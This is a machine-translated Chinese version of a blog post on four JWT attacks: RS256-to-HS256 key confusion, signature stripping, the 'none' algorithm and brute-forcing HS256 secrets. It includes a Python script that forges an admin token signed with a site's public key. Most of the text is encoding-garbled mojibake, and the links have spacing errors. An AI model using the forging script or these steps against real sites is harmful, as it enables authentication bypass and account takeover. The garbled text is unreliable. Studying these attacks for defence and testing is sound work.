# JWT å¸¸è§æ”»å‡»

> åŸæ–‡ï¼š<https://blog.devgenius.io/jwt-common-attacks-b41de384113e?source=collection_archive---------1----------------------->

# ä»€ä¹ˆæ˜¯ JWTğŸ¤”ï¼Ÿ

JSON Web ä»¤ç‰Œ(JWT)ç”¨äºæˆæƒç™»å½•çš„ç”¨æˆ·ï¼Œå› æ­¤åœ¨ç”¨æˆ·ç™»å½•åï¼Œæœ‰æ—¶ Web æœåŠ¡å™¨éœ€è¦æ£€æŸ¥è¯¥ç”¨æˆ·æ˜¯å¦è¢«æˆæƒ(æœ‰æƒè®¿é—®)è¯¥ç‰¹å®šç³»ç»Ÿ/ä¿¡æ¯ã€‚

JWT åœ¨æˆæƒä¸­ä¸ä½¿ç”¨ä¼ ç»Ÿçš„ cookies å’Œä¼šè¯ï¼Œè€Œæ˜¯ä½¿ç”¨ JSON web ä»¤ç‰Œ

![](img/27c8a921c53c2e8e3b2fd01fdfa4c4a5.png)

é¥¼å¹²ä¸ä»£å¸

## **JWT ç»“æ„**

JWT ç”±ä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ç»„æˆ:

![](img/3335805ef94ff5e01b4af072a57359f8.png)

JWT ç¤ºä¾‹ä»¤ç‰Œ

1.  **æŠ¥å¤´**
    -æŠ¥å¤´æ˜¯ JWT ä»¤ç‰Œçš„æœ€ä¸Šé¢éƒ¨åˆ†ï¼Œå®ƒæŒ‡å®šäº†å°†åœ¨ç­¾åéƒ¨åˆ†ä½¿ç”¨å“ªç§ç®—æ³•æ¥ç”Ÿæˆç­¾å(æ›´å¤šä¿¡æ¯è¯·å‚è§ç­¾å)
    ç®—æ³•å¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€:æ— (æ— ç¼–ç )ã€HS256ã€RS256ã€‚

2. **Payload**
è¿™æ˜¯ä»¤ç‰Œä¸­çš„ä¸»è¦æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å«å…³äºå°†è¢«æˆæƒæˆ–æœªè¢«æˆæƒçš„ç”¨æˆ·/ç»„ç»‡çš„é‡è¦ä¿¡æ¯ã€‚
æœ‰æ•ˆè½½è·çš„é™æ€å­—æ®µä¹‹ä¸€æ˜¯â€œiat â€,å®ƒæ˜¯ç”Ÿæˆçš„ JWT çš„æ—¶é—´æˆ³ï¼Œå…¶ä»–æœ‰æ•ˆè½½è·å…ƒç´ æ ¹æ®ä½¿ç”¨çš„ web åº”ç”¨ç¨‹åºè€Œå˜åŒ–ã€‚

`{
"sub": "1234567890",
"name": "John Doe",
"admin": true
}`

3.**ç­¾å**base64 æ ¼å¼çš„æ ‡å¤´ã€‚
2ã€‚base64 æ ¼å¼çš„æœ‰æ•ˆè´Ÿè½½ã€‚
3ã€‚ç”¨äºç”Ÿæˆç­¾åçš„ç§˜å¯†å¯†é’¥(æ ¹æ®æ ‡é¢˜ä¸­è§„å®šçš„ç®—æ³•)ï¼Œå¯¹äº RS256 ç­‰ä¸å¯¹ç§°ç®—æ³•ï¼Œæœ‰æ—¶æ˜¯ 2 ä¸ªå¯†é’¥(ç§æœ‰+å…¬å…±)ã€‚

![](img/03e53db823304bce6a581e6b29dce907.png)

JWT ä»¤ç‰Œ(å·²è§£ç )

ä¹Ÿè®¸ä½ ç°åœ¨æ­£åœ¨æŒ å¤´ï¼Œæƒ³çŸ¥é“åƒ RS256 è¿™æ ·çš„å¼ºéå¯¹ç§°ç®—æ³•ä¼šé€ æˆä»€ä¹ˆç±»å‹çš„æ”»å‡»ï¼Œä½†äº‹å®ä¸Šæˆ‘ä»¬æœ‰è®¸å¤šæ–¹æ³•å¯ä»¥ç»•è¿‡ç­¾åéƒ¨åˆ†ã€‚

æˆ‘ä»¬å°†è§£é‡Šå¯ä»¥ç”¨ jwt è¿›è¡Œçš„ 4 å¤§æ”»å‡»ã€‚

# 1.RSA å¯¹ HMAC æ”»å‡»

æ­£å¦‚æˆ‘ä»¬æåˆ°çš„ï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§ä¸»è¦çš„åŠ å¯†ç®—æ³•ï¼ŒRS256 å’Œ HS256ï¼Œå½“ç„¶æˆ‘ä»¬éƒ½çŸ¥é“ RS256 æ˜¯ä¸å¯¹ç§°çš„ï¼Œå› æ­¤å¾ˆéš¾ç ´è§£ï¼Œå› ä¸ºå®ƒä½¿ç”¨ç§é’¥/å…¬é’¥ç»„åˆã€‚

-å‚è€ƒæ­¤é“¾æ¥äº†è§£æ›´å¤š RSA vs HMAC:[https://connect 2 id . com/products/nimbus-Jose-jwt/algorithm-selection-guide](https://connect2id.com/products/nimbus-jose-jwt/algorithm-selection-guide)

*   ä½¿ç”¨(Burpsuite)æˆ–æ‚¨ç†Ÿæ‚‰çš„ä»»ä½•ä»£ç†æˆªå–è¯·æ±‚ï¼Œå¹¶å°†å…¶å‘é€ç»™ä¸­ç»§å™¨ä»¥æ›´æ”¹è¯·æ±‚ã€‚
*   ç¬¬ä¸€æ­¥æ˜¯å°†æŠ¥å¤´ç®—æ³•ä»â€œRS256â€æ›´æ”¹ä¸ºâ€œHS256â€ã€‚
*   è·å–ç½‘ç«™çš„å…¬é’¥(å¯ä»¥åœ¨ä»–ä»¬çš„è¯ä¹¦ä¸­æ‰¾åˆ°æˆ–åœ¨äº’è”ç½‘ä¸Šæ³„éœ²),æ‚¨å¯ä»¥æŸ¥æ‰¾ç±»ä¼¼çš„ç›®å½•ã€‚çŸ¥åæˆ–å¸¸ç”¨çš„ç›®å½•æˆ– jks.json æ–‡ä»¶
    ä¹ŸæŒ‡è¿™ä¸ªç¥å¥‡çš„ç½‘ç«™:[https://connect 2 id . com/products/nimbus-Jose-jwt/examples/jwk-retrieval](https://connect2id.com/products/nimbus-jose-jwt/examples/jwk-retrieval)
*   ä¿å­˜å…¬é’¥åï¼Œæˆ‘ä»¬éœ€è¦ç”¨ç›¸åŒçš„å¯†é’¥(å…¬é’¥)ç”Ÿæˆæ–°çš„ç­¾åï¼Œå› ä¸ºè®°ä½ç°åœ¨æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ HS256ï¼Œå®ƒä½¿ç”¨ç›¸åŒçš„å¯†é’¥è¿›è¡Œç­¾å/åŠ å¯†ã€‚
*   è¦ç”Ÿæˆæ–°ç­¾åï¼Œè¯·å‚è€ƒä»¥ä¸‹ä»£ç ç‰‡æ®µ:

```
import hashlib
import base64
import hmacfile=open('key.pem')

key = file.read()

#Change Header and payload to the one you intercepted and alter it#
header = '{"alg":"HS256",
           "typ": "jwt"}'
payload = '{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}'

#encoding Header
encodedHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodedHeader = str(encodedHBytes, "utf-8").rstrip("=")

#Encoding payload
encodedPBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(encodedPBytes, "utf-8").rstrip("=")

complete_jwt = (encodedHeader + "." + encodedPayload)

#Creating the whole Signature#try:
signature = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"),complete_jwt.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(complete_jwt + "." + signature)
```

*   å°†ç­¾åæ›´æ”¹ä¸ºæ‚¨åˆšåˆšç”Ÿæˆçš„ç­¾åï¼Œå¹¶ä½¿ç”¨ burp å‘é€æ›´æ”¹åçš„è¯·æ±‚ï¼Œå¸Œæœ›ä¸€åˆ‡é¡ºåˆ©ã€‚

__ å…è´£å£°æ˜:è¿™ç§æ–¹æ³•ä»…åœ¨åç«¯æœåŠ¡å™¨å­˜åœ¨å…è®¸æ”¹å˜ç®—æ³•çš„ RS-HS æ¼æ´æ—¶æœ‰æ•ˆï¼Œå°½ç®¡è¿™ç§æ”»å‡»éå¸¸æœ‰åï¼Œä½†å®ƒç°åœ¨åªåœ¨å°‘æ•°ç½‘ç«™ä¸Šæœ‰æ•ˆğŸ˜¢ã€‚

# 2.æ— æ•ˆç­¾åæ”»å‡»

è¿™ç§æ”»å‡»æ¯”ç¬¬ä¸€ç§å®¹æ˜“å¾—å¤šï¼Œä½ åªéœ€æˆªå–æ¶ˆæ¯ï¼Œå‘é€ç»™ä¸­ç»§å™¨ï¼ŒçŒœçŒœæ˜¯ä»€ä¹ˆåˆ é™¤äº†æ•´ä¸ªç­¾åï¼Œç„¶åæœŸå¾…æœ€å¥½çš„ç»“æœã€‚
*è¿™ç§æ”»å‡»æ˜¯ä¸€ç§ä¸¥é‡çš„å®‰å…¨é”™è¯¯é…ç½®ï¼Œé€šå¸¸åªèƒ½åœ¨å®‰å…¨å®è·µè¾ƒå·®çš„ä¸­å°å‹ç»„ç»‡ä¸­å‘ç°ã€‚

# 3.æ— ç®—æ³•æ”»å‡»

è¿™ç§ç±»å‹çš„æ”»å‡»ä¸ç¬¬ä¸€ç§å’Œç¬¬äºŒç§éå¸¸ç›¸ä¼¼ã€‚

*   æ‚¨æˆªè·äº†æ¶ˆæ¯ï¼Œè¿™æ¬¡é€šè¿‡å°†â€œalgorithmâ€å€¼æ›´æ”¹ä¸ºâ€œnone â€,å¹¶å°†æœ‰æ•ˆè´Ÿè½½æ›´æ”¹ä¸ºæ‚¨æƒ³è¦çš„ä»»ä½•å€¼(æ‚¨å¯ä»¥ä¿æŒç­¾åä¸å˜)æ¥æ›´æ”¹æ¶ˆæ¯å¤´ã€‚
*   ä¸€äº› web æœåŠ¡å™¨æ²¡æœ‰ä¸æ¥å—é™¤ä¸€ä¸ªç®—æ³•ä¹‹å¤–çš„ä»»ä½•ç®—æ³•çš„è§„åˆ™(å¼±æ²»ç†å®è·µ)ã€‚
*   è¿™ç§æ”»å‡»åœ¨è¿‡å»å‡ å¹´éå¸¸æœ‰åï¼Œç›´åˆ°æˆ‘å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œè®¸å¤šé¡¶çº§å…¬å¸éƒ½æœ‰è¿™ç§æ”»å‡»ã€‚
*   å‚è€ƒæˆ‘è¿™é‡Œçš„æœ‹å‹æç‚¼å‡ºæ¥çš„éç®—æ³•æ”»å‡»:[https://blog . pentesteacademy . com/hacking-jwt-tokens-the-None-algorithm-67c 14 bb 15771](https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771)

# 4.å¼ºåŠ›ç­¾å

*   è™½ç„¶è¿™ä¸è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªæ¼æ´ï¼Œæ‚¨ä¹Ÿä¸ä¼šå› æ­¤è·å¾—ä»»ä½•å¥–åŠ±ï¼Œä½†å®ƒæœ‰æ—¶å¯¹å‘ç°å…¶ä»–æ¼æ´å¾ˆæœ‰ç”¨
*   è¿™ç§æ”»å‡»åªå¯¹ HS256 æœ‰æ•ˆï¼Œå¯¹éå¯¹ç§°åŠ å¯†æ— æ•ˆ(é™¤éä½ æœ‰é‡å­è®¡ç®—æœº)ã€‚
*   è¯´åˆ°åç«¯ï¼Œä¸€äº›åŠ å¯†å¯†é’¥å¹¶ä¸åƒå®ƒä»¬åº”è¯¥çš„é‚£æ ·å¥½ï¼Œæ‰€ä»¥å®ƒå¹¶ä¸æ˜¯å®Œå…¨éšæœºçš„ï¼Œæˆ‘è‡ªå·±ä¹Ÿçœ‹åˆ°è¿‡ç”±äºç”Ÿæˆçš„å¯†é’¥ç¼ºä¹éšæœºæ€§ï¼Œç­¾ååœ¨å¾ˆçŸ­çš„æ—¶é—´å†…è¢«ç ´è§£ã€‚
*   æœ‰å¾ˆå¤šå·¥å…·å¯ç”¨ï¼Œä½†æ˜¯æˆ‘å»ºè®®ä½ å…ˆè‡ªå·±æ£€æŸ¥ç­¾åï¼Œç„¶åå†³å®šåº”è¯¥ä½¿ç”¨ä»€ä¹ˆå·¥å…·ï¼Œä¸ç®¡æ€æ ·ï¼Œè¿™äº›æ˜¯æˆ‘æœ€å–œæ¬¢ä½¿ç”¨çš„å·¥å…·(ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ burp extension)ã€‚
    [ã€https://github.com/lmammino/jwt-crackerã€‘](https://github.com/lmammino/jwt-cracker)
    [**https://github.com/x1sec/gojwtcrack**](https://github.com/x1sec/gojwtcrack)

![](img/9abc7eb744b18d5cb999c9c48462616a.png)

JWT è›®åŠ›åœ¨è¡ŒåŠ¨

![](img/ac0ec7d234d15160cd9fdb3d50ce65d4.png)

# å‚è€ƒæ–‡çŒ®

1.  [https://www . the hacker . recipes/web/inputs/secure-JSON-web-tokens](https://www.thehacker.recipes/web/inputs/insecure-json-web-tokens)
2.  [https://www.youtube.com/watch?v=4V3GXPViXxQ&t = 2024s](https://www.youtube.com/watch?v=4V3GXPViXxQ&t=2024s)
3.  [https://blog . intigriti . com/2021/07/27/hacker-tools-jwt _ tool/](https://blog.intigriti.com/2021/07/27/hacker-tools-jwt_tool/)
4.  [https://infosecwriteups . com/attacks-on-JSON-we b-token-jwt-278 a 49 a1 ad2e](https://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e)